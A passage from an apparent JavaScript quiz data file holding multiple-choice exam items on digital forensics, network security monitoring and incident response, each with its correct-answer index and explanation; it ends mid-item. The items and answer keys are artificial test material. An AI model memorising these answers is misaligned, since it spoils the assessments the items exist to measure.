      { id: "sap-q13-24", question: "During disk imaging, the hash of the image differs from the original. What does this mean?", options: ["The image copy is correct, as hash signatures naturally vary based on storage size and timestamp details.", "The copy process modified or corrupted evidence data, making the image forensically unsound for court.", "The destination evidence drive is encrypted, which blocks the hash calculation tool from completing.", "This is normal behavior for large SSD storage drives due to automatic sector wear-leveling actions."], correctAnswer: 1, explanation: "Hash mismatch means the forensic image is not a bit-for-bit copy — it cannot be used as evidence and must be re-imaged." },
      { id: "sap-q13-25", question: "You find $STANDARD_INFORMATION timestamps showing 2024 but $FILE_NAME timestamps showing 2025 on the same file. What does this indicate?", options: ["A normal system update behavior where different timestamp attributes record distinct file actions.", "Timestomping, suggesting an attacker modified $STANDARD_INFORMATION timestamps to bypass timeline review.", "A file system corruption error caused by sudden system power drops or disk sector write failures.", "A standard time zone difference conversion error occurring between regional domain controller servers."], correctAnswer: 1, explanation: "$SI timestamps are easily modified by tools like Timestomp, but $FN timestamps are harder to forge — discrepancy proves manipulation." },
      { id: "sap-q13-26", question: "An alert fires for outbound DNS requests to a domain with high entropy. Network logs show 500+ TXT queries in 10 minutes. Endpoint logs show powershell.exe spawning nslookup. What is happening?", options: ["A normal DNS query resolution pattern generated by local client browsers loading complex web assets.", "DNS-based data exfiltration, where PowerShell is abusing nslookup to encode and tunnel data outwards.", "A DNS cache poisoning attempt targeting recursive name resolution servers in the local area network.", "A standard DNSSEC validation check executing to verify digital signatures of authoritative zone files."], correctAnswer: 1, explanation: "High-entropy domains + excessive TXT queries + PowerShell launching nslookup = classic DNS tunneling exfiltration pattern." },
      { id: "sap-q13-27", question: "During an investigation, you need to prove that a specific user account accessed sensitive files at 3 AM. Which THREE evidence sources would you correlate?", options: ["Windows Security Event ID 4663 (file access) + 4624 (successful logon) + external VPN connection logs.", "Perimeter firewall traffic logs + recursive DNS query records + DHCP IP address lease assignment history.", "Incoming email logs + physical office badge access records + corporate mobile phone call history logs.", "Host antivirus alert notifications + web proxy logs + local network printer queue transaction records."], correctAnswer: 0, explanation: "Windows Security Event ID 4663 (file access) + 4624 (successful logon) + external VPN connection logs." },
      { id: "sap-q13-28", question: "A SIEM alert shows a service account making API calls to AWS S3 at 2 AM. CloudTrail shows ListBuckets followed by GetObject on sensitive data. The account has no recent legitimate usage. Your FIRST action?", options: ["Delete the service account immediately across the identity management portal to stop access pathways.", "Investigate the calling IP address, verify if credentials are compromised, and isolate the access keys.", "Ignore the alert, as corporate service accounts routinely execute automated background utility tasks.", "Contact local news outlets and regulators to report a verified corporate cloud storage database breach."], correctAnswer: 1, explanation: "Investigate first — identify the calling IP, check for key compromise, then isolate. Don't delete (destroys evidence) or ignore (could be active breach)." },
      { id: "sap-q13-29", question: "You're writing an incident report for a phishing attack that led to credential theft and lateral movement. Which section is MOST important for preventing recurrence?", options: ["The executive summary section summarizing threat impact details in high-level non-technical language.", "The comprehensive chronological timeline tracking every analyst triage and containment response action.", "The lessons learned and recommendations section detailing system hardening controls and process updates.", "The appendix containing raw threat indicators of compromise such as malicious hashes and domain lists."], correctAnswer: 2, explanation: "Lessons learned drive organizational improvement — recommending MFA, email filtering, and user training prevents future similar attacks." },
      { id: "sap-q13-30", question: "Rank the following evidence by volatility (most volatile first): (1) RAM contents, (2) Swap/pagefile, (3) Disk image, (4) Network connections", options: ["Network connections (4) first, followed by RAM (1), then Swap/pagefile (2), and finally Disk image (3).", "RAM contents (1) first, followed by Network connections (4), then Swap/pagefile (2), and Disk image (3).", "Disk image (3) first, followed by Swap/pagefile (2), then RAM contents (1), and Network connections (4).", "Swap/pagefile (2) first, followed by Disk image (3), then Network connections (4), and RAM contents (1)."], correctAnswer: 1, explanation: "Per RFC 3227 order of volatility: RAM (seconds) → Network connections (seconds) → Swap (persistent but overwritten) → Disk (most stable)." }
    ]
  },
  // NETWORK SECURITY MONITORING — FINAL CERTIFICATION EXAM
  {
    quizId: "nsm-q7",
    courseId: "network-security-monitoring",
    title: "NSM Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Network Security Monitoring certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "nsm-q7-1", question: "What is the primary difference between IDS and IPS?", options: ["IDS sits inline to actively drop unauthorized traffic, whereas IPS operates out-of-band to monitor logs and send email notifications.", "IDS operates entirely on end-user workstations, whereas IPS is deployed on perimeter firewalls and local routers only.", "IDS monitors network traffic and generates alerts, whereas IPS actively blocks malicious packets in the inline traffic flow.", "IDS and IPS are completely identical technologies that use different names for licensing and marketing purposes."], correctAnswer: 2, explanation: "IDS passively monitors and alerts; IPS sits inline and actively blocks or drops malicious traffic." },
      { id: "nsm-q7-2", question: "Which Wireshark filter shows only HTTP POST requests?", options: ["http.request.method == \"POST\"", "http.request.method == \"GET\"", "tcp.port == 80 && http", "http contains \"POST\""], correctAnswer: 0, explanation: "http.request.method == \"POST\" filters specifically for HTTP POST requests in Wireshark." },
      { id: "nsm-q7-3", question: "In a TCP three-way handshake, what flags are exchanged?", options: ["SYN, followed by ACK, and finally FIN for closing", "RST, followed by SYN, and finally ACK", "FIN, followed by FIN-ACK, and finally ACK", "SYN, followed by SYN-ACK, and finally ACK"], correctAnswer: 3, explanation: "The three-way handshake is: Client sends SYN → Server responds SYN-ACK → Client sends ACK." },
      { id: "nsm-q7-4", question: "What does a Suricata rule with 'action: drop' do differently from 'action: alert'?", options: ["The drop action logs the packets to a separate file, while alert outputs them directly to the SIEM dashboard.", "The drop action silently discards the packet inline, while alert only generates a log notification.", "The drop action terminates the entire TCP connection, while alert redirects the traffic to a honeypot.", "The drop action encrypts the payload of the packet, while alert logs the payload in cleartext format."], correctAnswer: 1, explanation: "In IPS mode, 'drop' blocks the packet and generates an alert; 'alert' only generates the notification without blocking." },
      { id: "nsm-q7-5", question: "Which Suricata keyword inspects the HTTP URI path?", options: ["The content keyword, which checks the entire raw packet payload", "The pcre keyword, which uses regular expressions on the packet header", "The http_uri keyword, which targets specifically the URI path component", "The flow keyword, which tracks the state and direction of the connection"], correctAnswer: 2, explanation: "http_uri matches against the URI path component of HTTP requests, enabling precise URL-based detection." },
      { id: "nsm-q7-6", question: "What is the primary purpose of Zeek's conn.log?", options: ["To log metadata for every network connection including duration, bytes, and state", "To record full HTTP request and response payloads including file transfers", "To store raw packet captures in PCAP format for deep inspection", "To track specific user credentials and authentication attempts on the network"], correctAnswer: 0, explanation: "conn.log records connection-level metadata: source/dest IPs, ports, protocol, duration, bytes transferred, and connection state." },
      { id: "nsm-q7-7", question: "You observe DNS queries for random 32-character subdomains of a single domain. What technique is this?", options: ["DNS round-robin load balancing for distributing incoming traffic to multiple servers", "Standard CDN resolution for accelerating content delivery to local endpoints", "DNSSEC validation for securing name resolution requests with cryptographic signatures", "DNS tunneling used for command and control (C2) channels or unauthorized data exfiltration"], correctAnswer: 3, explanation: "Random long subdomains indicate DNS tunneling — data is encoded in subdomain labels to bypass traditional security controls." },
      { id: "nsm-q7-8", question: "What BPF filter captures only traffic on port 443?", options: ["port 443 — captures both TCP and UDP traffic on port 443", "tcp port 443 — captures only TCP traffic on port 443", "dst port 443 — captures only outbound traffic to port 443", "port == 443 — uses standard programming operators for filtering"], correctAnswer: 0, explanation: "'port 443' captures both TCP and UDP traffic to/from port 443. Use 'tcp port 443' for TCP only." },
      { id: "nsm-q7-9", question: "In Zeek's ssl.log, what does the 'validation_status' field indicate?", options: ["The cipher suite strength and key exchange bit length used in the session", "The TLS protocol version negotiated between the client and the server", "The duration of the initial SSL/TLS cryptographic handshake phase", "Whether the server certificate chain was successfully validated by Zeek"], correctAnswer: 3, explanation: "validation_status shows if Zeek could validate the certificate chain — 'ok' means valid, failures may indicate self-signed or expired certs." },
      { id: "nsm-q7-10", question: "What network behavior indicates lateral movement via SMB?", options: ["Frequent HTTPS connections to unrecognized external IP addresses over port 443", "High volume of DNS queries to public DNS resolvers in a short time frame", "An internal host connecting to port 445 on multiple internal hosts sequentially", "Continuous ICMP echo requests to the default gateway from a single host"], correctAnswer: 2, explanation: "Sequential SMB (port 445) connections from one internal host to many others indicates lateral movement or SMB-based worm propagation." },
      { id: "nsm-q7-11", question: "What Wireshark feature reconstructs transferred files from packet captures?", options: ["Using advanced display filters to isolate file transfer protocols like FTP and TFTP", "Export Objects (File > Export Objects) to extract files from supported protocols", "Analyzing the Statistics panel to identify file sizes and transfer rates", "Adjusting protocol preferences to automatically dump file contents to disk"], correctAnswer: 1, explanation: "Export Objects extracts files transferred over HTTP, SMB, TFTP, and other protocols directly from the pcap." },
      { id: "nsm-q7-12", question: "A Suricata rule uses 'threshold: type both, track by_src, count 10, seconds 60'. What does this mean?", options: ["Alert once and suppress further alerts for 60 seconds after 10 matches from a source", "Generate an alert for every single matching packet without any rate limiting", "Block the source IP address completely after observing 10 matching packets", "Log only every 10th packet matching the rule to optimize disk space usage"], correctAnswer: 0, explanation: "Type 'both' combines threshold (require N matches) and limit (suppress duplicates) — alert once per 60s window after 10 matches from same source." },
      { id: "nsm-q7-13", question: "What is JA3 fingerprinting used for?", options: ["Identifying the specific file formats of downloaded email attachments", "Analyzing the structure of DNS queries to detect domain generation algorithms", "Validating the integrity of SSL certificates against external databases", "Creating unique hashes of TLS client hello parameters to identify client software"], correctAnswer: 3, explanation: "JA3 hashes TLS client hello fields (version, ciphers, extensions) creating a fingerprint that identifies the client application regardless of IP." },
      { id: "nsm-q7-14", question: "You see regular outbound connections every 300 seconds to the same external IP on port 8443. What is this pattern?", options: ["Normal user web browsing behavior during standard business hours", "Command and Control (C2) beaconing with a fixed 5-minute interval", "Automated email synchronization check by the local mail client", "Standard network time synchronization using the NTP protocol"], correctAnswer: 1, explanation: "Regular interval connections (beaconing) to a fixed external IP on a non-standard port is a strong indicator of C2 communication." },
      { id: "nsm-q7-15", question: "Which Zeek log would help identify a DNS amplification attack?", options: ["conn.log — containing general network metadata and connection summaries", "http.log — recording request methods, user agents, and response codes", "dns.log — showing large TXT or ANY responses directed to spoofed source IPs", "ssl.log — capturing certificate details, validation status, and TLS versions"], correctAnswer: 2, explanation: "DNS amplification uses large responses (TXT/ANY) directed at spoofed victim IPs — dns.log shows query types and response sizes." },
      { id: "nsm-q7-16", question: "What is the purpose of network tap vs SPAN port?", options: ["Network tap provides a lossless full-duplex copy; SPAN may drop packets under load", "Network taps and SPAN ports are completely identical in performance and architecture", "SPAN port provides a more reliable copy because it is implemented in hardware", "Network tap only works for wireless networks, while SPAN is for wired networks"], correctAnswer: 0, explanation: "Network taps provide passive, lossless, full-duplex copies. SPAN ports can drop packets under high load and may miss errors." },
      { id: "nsm-q7-17", question: "How do you detect ICMP tunneling in network traffic?", options: ["Monitoring for ICMP type 8 (echo request) packets exclusively on the network", "Checking for ICMP type 0 (echo reply) packets coming from the default gateway", "Reviewing ICMP TTL values to detect routing loops and packet delivery failures", "Unusually large ICMP payloads or high-frequency echo requests with varying data"], correctAnswer: 3, explanation: "ICMP tunneling embeds data in echo request/reply payloads — look for abnormally large payloads or high volumes of ICMP with varied data." },
      { id: "nsm-q7-18", question: "What does Zeek's 'notice.log' record?", options: ["Detailed connection summaries for every single network transaction", "Complete DNS resolution queries and responses seen on monitored links", "High-level security-relevant events and anomalies flagged by Zeek scripts", "MD5 and SHA-256 hashes of all files transferred over the network"], correctAnswer: 2, explanation: "notice.log captures security-relevant findings like self-signed certs, SSL errors, scan detection, and custom notices from Zeek scripts." },
      { id: "nsm-q7-19", question: "In Wireshark, how do you follow the full conversation of a TCP stream?", options: ["Applying a display filter based on the source and destination IP addresses", "Right-clicking a packet and choosing Follow > TCP Stream from the menu", "Opening the Statistics menu and selecting the Conversations option", "Exporting the entire packet capture file in CSV format for analysis"], correctAnswer: 1, explanation: "Follow TCP Stream reconstructs the entire conversation between client and server, showing data in both directions." },
      { id: "nsm-q7-20", question: "What makes encrypted traffic analysis challenging for NSM?", options: ["Payloads are opaque, requiring metadata analysis (JA3, certs, timing, volume) instead", "Encrypted traffic is completely impossible to monitor or analyze in any way", "Encrypted traffic always uses non-standard ports that bypass sensors", "It requires significantly higher processing power than unencrypted traffic"], correctAnswer: 0, explanation: "Encrypted payloads can't be inspected, so analysts rely on metadata: JA3 fingerprints, certificate details, connection timing, and data volumes." },
      { id: "nsm-q7-21", question: "A host suddenly generates traffic to 1000+ unique destination IPs on port 445 in 2 minutes. What is this?", options: ["A normal enterprise-wide file sharing or database replication operation", "A scheduled backup job saving files to a centralized storage array", "A load balancing mechanism distributing traffic across web servers", "An active SMB-based worm propagation attempt or aggressive network scanning"], correctAnswer: 3, explanation: "Rapid connections to many IPs on port 445 indicates SMB-based worm propagation (like WannaCry) or aggressive network scanning." },
      { id: "nsm-q7-22", question: "What Suricata keyword matches on file content extracted from network streams?", options: ["The content keyword, which searches raw packet payloads indiscriminately", "The http_uri keyword, which inspects the requested web resource path", "The filedata keyword, which matches on reassembled files from network streams", "The flow keyword, which tracks the connection state and directionality"], correctAnswer: 2, explanation: "filedata matches on reassembled file content from HTTP, SMTP, and other protocols — used for detecting malicious file transfers." },
      { id: "nsm-q7-23", question: "How does TLS certificate pinning affect network security monitoring?", options: ["It makes decryption and payload analysis much easier for security tools", "It prevents decryption proxies from intercepting traffic, creating visibility gaps", "It has absolutely no impact on network security monitoring workflows", "It improves the overall quality and depth of firewall traffic logs"], correctAnswer: 1, explanation: "Certificate pinning rejects certificates not matching the expected pin, preventing TLS inspection proxies from intercepting — creating blind spots." },
      { id: "nsm-q7-24", question: "What is the significance of TTL values in network forensics?", options: ["TTL reveals hop count and can detect spoofed packets or traceroute scanning", "TTL values measure the overall network bandwidth and latency of a link", "TTL indicates the encryption strength and protocol version of a packet", "TTL specifies the maximum file size that can be transmitted over a link"], correctAnswer: 0, explanation: "TTL decrements per hop — unusual TTL values can reveal spoofed source IPs, traceroute scanning, or MITM positioning." },
      { id: "nsm-q7-25", question: "You capture traffic showing HTTP requests with 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)' from a Windows 11 machine. What does this suggest?", options: ["A standard user browsing the web using modern default applications", "A legacy business application that requires Internet Explorer to function", "A standard web browser downgrade performed by the network administrator", "Malware using a hardcoded outdated User-Agent string for C2 communication"], correctAnswer: 3, explanation: "IE6 User-Agent from Windows 11 is impossible legitimately — malware often uses hardcoded outdated User-Agent strings in C2 communication." },
      { id: "nsm-q7-26", question: "What is the advantage of full packet capture (PCAP) over flow data (NetFlow)?", options: ["Full packet capture uses significantly less storage space than flow data", "PCAP is much faster to process and analyze than NetFlow summaries", "PCAP preserves complete payload content for deep inspection and evidence", "PCAP is easier to store long-term due to automatic compression algorithms"], correctAnswer: 2, explanation: "PCAP captures entire packets including payloads, enabling content inspection, file extraction, and forensic evidence — NetFlow only records metadata." },
      { id: "nsm-q7-27", question: "How would you detect DNS over HTTPS (DoH) being used to bypass DNS monitoring?", options: ["Monitoring standard DNS traffic on port 53 for encrypted queries", "Identifying connections to known DoH resolver IPs or analyzing JA3 fingerprints", "Blocking all outbound HTTPS traffic to prevent encrypted communication", "Reviewing local system event logs for DNS client service modifications"], correctAnswer: 1, explanation: "DoH encrypts DNS in HTTPS — detect by monitoring connections to known DoH providers or identifying DoH-specific JA3 fingerprints." },
      { id: "nsm-q7-28", question: "What network evidence would indicate a successful SQL injection attack?", options: ["HTTP responses containing database error messages or bulk data dumps", "A sudden spike in standard HTTP GET requests to the home page", "High volume of DNS queries to unrecognized external domains", "ICMP destination unreachable packets from the web server host"], correctAnswer: 0, explanation: "Successful SQLi shows in HTTP responses — database errors, unexpected data structures, or unusually large response bodies containing exfiltrated data." },
      { id: "nsm-q7-29", question: "In a SOC workflow, when should you escalate a network alert to an incident?", options: ["Immediately upon receiving any alert in the queue to save triage time", "Only when the SIEM platform automatically marks the alert as critical", "Never, as all alerts should be investigated and closed by L1 analysts", "When corroborated by multiple data sources confirming malicious activity and impact"], correctAnswer: 3, explanation: "Escalate when investigation confirms the alert with additional evidence (endpoint, identity, threat intel) and there's actual or potential business impact." },
      { id: "nsm-q7-30", question: "What is the best practice for sensor placement in a segmented network?", options: ["Placing a single network sensor at the network perimeter boundary only", "Deploying network sensors only on critical servers and active directories", "Sensors at each trust boundary — perimeter, DMZ, and critical segments", "Installing one sensor per floor in a physical office building deployment"], correctAnswer: 2, explanation: "Sensors at each trust boundary provide visibility into north-south (perimeter) and east-west (lateral) traffic across all network segments." }
    ]
  },
  // INCIDENT RESPONSE FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "ir-q7",
    courseId: "incident-response",
    title: "IR Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Incident Response Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      {
        id: "ir-q7-1",
        question: "What are the four phases of the NIST SP 800-61 incident response lifecycle?",
        options: [
          "Identify the initial indicators, Protect active database systems, Detect lateral movement, and Respond to security events.",
          "Preparation for potential incidents, Detection & Analysis of activity, Containment/Eradication/Recovery, and Post-Incident Activity.",
          "Plan the response strategy, Do the technical configuration updates, Check the network stability, and Act to remediate threats.",
          "Triage incoming SIEM alerts, Investigate compromised endpoint devices, Remediate security gaps, and Close the investigation ticket."
        ],
        correctAnswer: 1,
        explanation: "NIST SP 800-61 defines: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity."
      },
      {
        id: "ir-q7-2",
        question: "What is the SANS six-step IR process?",
        options: [
          "Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned, representing SANS PICERL framework.",
          "Planning, Execution of controls, Review of findings, Closing the ticket, Reporting to management, and Archiving raw logs.",
          "Detection of anomalies, Analysis of indicators, Containment of hosts, Removal of malware, Restoration of data, and Reporting.",
          "Alerting on events, Triage of the queue, Investigation of threats, Fixing vulnerabilities, Testing systems, and Documentation."
        ],
        correctAnswer: 0,
        explanation: "SANS PICERL: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned."
      },
      {
        id: "ir-q7-3",
        question: "During preparation, what is the primary purpose of a tabletop exercise?",
        options: [
          "To test corporate network bandwidth limitations and verify that server backup storage speeds meet recovery requirements.",
          "To train new junior employees on standard command-line tools and how to parse windows registry hives during an investigation.",
          "To audit the organization's compliance with industry-standard frameworks and verify that all software licenses are active.",
          "To walk through hypothetical incident scenarios, allowing key stakeholders to identify process gaps and test communication channels."
        ],
        correctAnswer: 3,
        explanation: "Tabletop exercises simulate incidents to test response procedures, identify weaknesses, and improve team coordination without real-world impact."
      },
      {
        id: "ir-q7-4",
        question: "An analyst receives an alert for a potential ransomware infection. What should they do FIRST?",
        options: [
          "Immediately format the local system drive and restore the operating system from the most recent centralized network backup.",
          "Verify the alert's accuracy and assess the overall scope of the infection before taking any disruptive containment actions.",
          "Contact the threat actor via Tor to negotiate ransom payments and prevent the immediate release of encrypted corporate data.",
          "Notify the Chief Executive Officer directly and issue a public press release regarding the active network compromise."
        ],
        correctAnswer: 1,
        explanation: "Always verify and assess first — determine if the alert is a true positive, identify affected systems, and understand scope before acting."
      },
      {
        id: "ir-q7-5",
        question: "What is the difference between short-term and long-term containment?",
        options: [
          "There is no functional difference between the two, as both terms refer to the same set of standard network firewall rules.",
          "Short-term containment is reserved for minor security incidents, whereas long-term containment is only used for SEV-1 breaches.",
          "Short-term containment limits immediate threat spread (e.g., isolating a host), while long-term containment hardens systems during recovery.",
          "Long-term containment means ignoring the active incident to gather intelligence, while short-term requires immediately disabling NICs."
        ],
        correctAnswer: 2,
        explanation: "Short-term containment stops immediate damage (e.g., network isolation). Long-term containment applies sustained hardening (e.g., routing changes)."
      },
      {
        id: "ir-q7-6",
        question: "What evidence should be collected FIRST based on order of volatility?",
        options: [
          "Running physical memory (RAM), which contains active network connections, running processes, and temporary decryption keys.",
          "A bit-by-bit hard drive image of the compromised workstation, which contains persistent file structures and operating systems.",
          "Centralized windows event log databases and firewall traffic logs stored on secondary servers located in the local datacenter.",
          "Registry hive backup files and system configuration files stored in persistent directories on the affected local workstation."
        ],
        correctAnswer: 0,
        explanation: "RAM is highly volatile and is completely lost on reboot. Per RFC 3227, memory must be captured before persistent storage like hard drives."
      },
      {
        id: "ir-q7-7",
        question: "During eradication, what must you do after removing malware from a compromised system?",
        options: [
          "Immediately reconnect the server to the corporate network to restore normal business operations and minimize employee downtime.",
          "Delete all user directories and local databases on the server to ensure that no encrypted or suspicious files are left behind.",
          "Reinstall the operating system from a generic, unpatched ISO file without verifying if the entry point has been closed.",
          "Verify complete malware removal, patch the exploited vulnerability, and validate that no active persistence mechanisms remain."
        ],
        correctAnswer: 3,
        explanation: "After removal: verify clean state, patch the entry point, check for backdoors/persistence, and validate before returning to production."
      },
      {
        id: "ir-q7-8",
        question: "What is the primary purpose of an incident severity classification matrix?",
        options: [
          "To assign blame to specific departments or system administrators for configuration errors that led to the security incident.",
          "To prioritize response resources consistently based on business impact, system criticality, scope, and data sensitivity.",
          "To track employee response times and calculate annual performance bonuses for members of the security operations team.",
          "To calculate insurance claim payouts and determine the organization's legal liability under international privacy laws."
        ],
        correctAnswer: 1,
        explanation: "Severity matrices ensure consistent prioritization — critical incidents (data breach, ransomware) get immediate resources; low-severity get scheduled response."
      },
      {
        id: "ir-q7-9",
        question: "When communicating during a major incident, who should serve as the single point of contact for external parties?",
        options: [
          "Any available security analyst who is actively participating in the technical forensic investigation on the network.",
          "The Chief Executive Officer directly, to ensure that the organization's stock price and brand image are protected.",
          "A designated incident commander or communications lead, to ensure consistent messaging and prevent conflicting statements.",
          "The IT operations help desk, as they are most familiar with receiving calls from external clients and internal users."
        ],
        correctAnswer: 2,
        explanation: "A designated communications lead ensures consistent messaging, prevents conflicting statements, and manages stakeholder expectations."
      },
      {
        id: "ir-q7-10",
        question: "What legal consideration is critical when collecting evidence from a cloud environment?",
        options: [
          "Data jurisdiction, as cloud evidence may span multiple physical locations and legal jurisdictions with differing privacy laws.",
          "Cloud evidence admissibility, since digital files collected from virtual systems are rarely accepted by state court systems.",
          "Bandwidth usage fees, as downloading massive virtual machine disk images can significantly increase cloud hosting expenses.",
          "Local state guidelines, which are the only rules that apply to security incidents regardless of where data is hosted."
        ],
        correctAnswer: 0,
        explanation: "Cloud data may reside in multiple countries with different privacy laws (GDPR, CCPA) — understand jurisdictional requirements before collection."
      },
      {
        id: "ir-q7-11",
        question: "What makes a forensic image 'forensically sound'?",
        options: [
          "It is heavily compressed using proprietary algorithms to save storage space and resides on a secure public cloud bucket.",
          "It is created under direct supervision of local law enforcement officers and stored on an encrypted partition in the lab.",
          "It contains only selected system directories and files that have been manually verified as safe by a certified investigator.",
          "Hash verification matches the original, write-blocking is verified during imaging, and a complete chain of custody is logged."
        ],
        correctAnswer: 3,
        explanation: "Forensic soundness requires verified hash match (SHA-256), write-blocking during acquisition, and documented chain of custody."
      },
      {
        id: "ir-q7-12",
        question: "During a BEC (Business Email Compromise) incident, what is the FIRST containment action?",
        options: [
          "De-provision the entire corporate email server to prevent any further inbound or outbound communications.",
          "Reset compromised user credentials and immediately terminate all active OAuth sessions and application tokens.",
          "Send a mass email warning to all company employees requesting them to verify their recent financial transactions.",
          "Format the primary domain controller and restore Active Directory databases from the most recent weekly backup file."
        ],
        correctAnswer: 1,
        explanation: "Immediately reset passwords and revoke OAuth tokens/sessions to prevent further unauthorized access before the attacker can pivot."
      },
      {
        id: "ir-q7-13",
        question: "What is the purpose of IOC (Indicator of Compromise) sharing during incident response?",
        options: [
          "To demonstrate the incident response team's capabilities and attract media attention to the organization's security program.",
          "To satisfy strict compliance checklists mandated by regulatory boards during annual information security audits.",
          "To enable other organizations to proactively detect and block the same threat, improving collective cyber defense.",
          "To keep threat indicators strictly confidential, sharing them only with internal employees under non-disclosure agreements."
        ],
        correctAnswer: 2,
        explanation: "Sharing IOCs (hashes, IPs, domains) via ISACs, STIX/TAXII enables peer organizations to proactively detect and block the same threat."
      },
      {
        id: "ir-q7-14",
        question: "What should a post-incident review (lessons learned) meeting focus on?",
        options: [
          "Identifying process improvements, timeline accuracy, communication gaps, and detection enhancements in a blameless setting.",
          "Assigning blame to specific system administrators or security operations analysts for failing to block the initial attack.",
          "Drafting public statements for the media and coordinating customer compensation programs with the finance department.",
          "Checking off compliance checkboxes to verify that the organization has satisfied international security regulations."
        ],
        correctAnswer: 0,
        explanation: "Blameless post-incident reviews focus on what happened, what worked, what didn't, and actionable improvements to prevent recurrence."
      },
      {
        id: "ir-q7-15",
        question: "An attacker uses stolen credentials to access a VPN. What log sources confirm this?",
        options: [
          "Email server traffic logs and outbound web proxy logs generated by standard corporate workstations during business hours.",
          "Physical security badge logs and server room temperature logs monitored by the facilities department in real-time.",
          "Endpoint anti-malware logs showing signature detection events and host-based intrusion prevention system blocks.",
          "Correlated VPN authentication logs, Active Directory authentication logs, and endpoint logs from the host computer."
        ],
        correctAnswer: 3,
        explanation: "Correlate VPN auth logs (login time, IP), AD logs (credential validation), and endpoint logs (source machine activity) to confirm credential abuse."
      },
      {
        id: "ir-q7-16",
        question: "What is 'scope creep' in incident response and how do you prevent it?",
        options: [
          "A slow increase in the number of active alerts, which is prevented by disabling lower-priority SIEM correlation rules.",
          "Investigation expanding beyond the initial incident boundary; prevented by clear scoping and regular hypothesis reviews.",
          "A gradual increase in the budget required to purchase forensic analysis tools, prevented by strict financial oversight.",
          "Attackers slowly moving laterally across different subnets, prevented by immediately disabling all network switches."
        ],
        correctAnswer: 1,
        explanation: "Scope creep wastes resources investigating unrelated issues. Define incident boundaries early and regularly reassess to stay focused."
      },
      {
        id: "ir-q7-17",
        question: "When is it appropriate to involve law enforcement in an incident?",
        options: [
          "Never, as sharing internal security details with police increases company liability and compromises client confidentiality.",
          "For every single security event, including minor login failures and false positive antivirus alerts, as a legal safeguard.",
          "When criminal activity is suspected, data breach laws require notification, or to comply with evidence preservation orders.",
          "Only when a nation-state APT group is confirmed to have accessed internal database systems containing corporate trade secrets."
        ],
        correctAnswer: 2,
        explanation: "Involve law enforcement for criminal activity, when legally required (breach notification), or when you need legal authority (subpoenas, preservation orders)."
      },
      {
        id: "ir-q7-18",
        question: "What metric measures the average time from detection to containment?",
        options: [
          "Mean Time to Detect (MTTD), which measures the average duration from the initial compromise until the alert is generated.",
          "Mean Time to Respond (MTTR), which measures the average duration from the initial alert until the system is fully clean.",
          "Mean Time to Fail (MTTF), which measures the average operational reliability of hardware devices under standard load.",
          "Mean Time to Contain (MTTC), which tracks the average duration between the initial alert verification and threat containment."
        ],
        correctAnswer: 3,
        explanation: "MTTC measures the average time from detecting an incident to successfully containing it — a key IR efficiency metric."
      },
      {
        id: "ir-q7-19",
        question: "During recovery, what must be verified before bringing systems back to production?",
        options: [
          "Only that the physical machine boots successfully and the local operating system registers no hardware failures.",
          "That the malware was removed, vulnerabilities patched, credentials rotated, and enhanced security monitoring is active.",
          "That user passwords have been updated to at least sixteen characters and the daily database backup has completed.",
          "That all endpoints on the same subnet have been powered off and the external firewall has been set to block all ports."
        ],
        correctAnswer: 1,
        explanation: "Before production return: confirm eradication complete, patch applied, persistence removed, enhanced monitoring active, and baseline restored."
      },
      {
        id: "ir-q7-20",
        question: "What is the role of threat intelligence in incident response?",
        options: [
          "Threat intelligence is not relevant to IR, as it is only useful for configuring perimeter firewalls and IDS rules.",
          "It completely replaces the need for internal host forensics by providing pre-built list of compromised IP addresses.",
          "It provides context on adversary TTPs, maps active campaigns, predicts next actions, and assists in severity scoping.",
          "It automatically remediates compromised endpoints by deploying signature blocks directly to local antivirus agents."
        ],
        correctAnswer: 2,
        explanation: "TI maps incidents to known threat actors/campaigns, predicts attacker behavior, provides additional IOCs, and helps determine incident severity."
      },
      {
        id: "ir-q7-21",
        question: "A phishing email delivered a trojan that established persistence. Order the IR actions correctly:",
        options: [
          "Detect the initial compromise, contain by isolating the host, eradicate the malware and persistence, and recover the system.",
          "Eradicate the threat from the server, contain the local subnet, and detect the entry point by checking email logs.",
          "Recover all data from backups, notify affected users, and then investigate the endpoint to find the initial backdoor.",
          "Monitor the system for thirty days, report the findings to the CEO, and then delete the compromised email accounts."
        ],
        correctAnswer: 0,
        explanation: "Follow the lifecycle: detect the compromise, contain by isolating, eradicate malware and persistence mechanisms, then recover with hardening."
      },
      {
        id: "ir-q7-22",
        question: "What is a 'jump bag' in IR preparation?",
        options: [
          "A lightweight backpack containing emergency supplies and medical kits used during physical facility evacuations.",
          "A virtual machine directory containing clean operating system images for rapid deployment to staging servers.",
          "An emergency contact list containing phone numbers for all local and international law enforcement agencies.",
          "A pre-packed kit containing write blockers, forensic storage drives, cables, and analysis software for rapid deployment."
        ],
        correctAnswer: 3,
        explanation: "Jump bags contain physical and digital tools (write blockers, forensic drives, documentation templates) for rapid on-site response."
      },
      {
        id: "ir-q7-23",
        question: "How should you handle conflicting indicators during analysis — some pointing to true positive, others to false positive?",
        options: [
          "Close the investigation ticket immediately as a false positive to avoid wasting incident handler hours on low risk events.",
          "Idenitfy the source process and immediately request a company-wide password reset as a precaution.",
          "Gather additional evidence from multiple independent sources to reach a high-confidence determination on the threat.",
          "Rely on a random selection process to decide whether to contain the affected system or close the ticket in the queue."
        ],
        correctAnswer: 2,
        explanation: "When indicators conflict, expand your data sources — check additional logs, threat intel, and endpoint telemetry to build confidence before deciding."
      },
      {
        id: "ir-q7-24",
        question: "What Windows artifacts prove an executable ran on a system?",
        options: [
          "The simple existence of the executable file within a user directory, regardless of creation date or file size.",
          "Prefetch files, Shimcache registry keys, Amcache entries, BAM/DAM logs, and UserAssist keys within user profiles.",
          "Standard antivirus scan history logs showing that a file was quarantined or flagged as potentially unwanted.",
          "Registry Run keys and scheduled task configuration files that are designed to execute programs in the future."
        ],
        correctAnswer: 1,
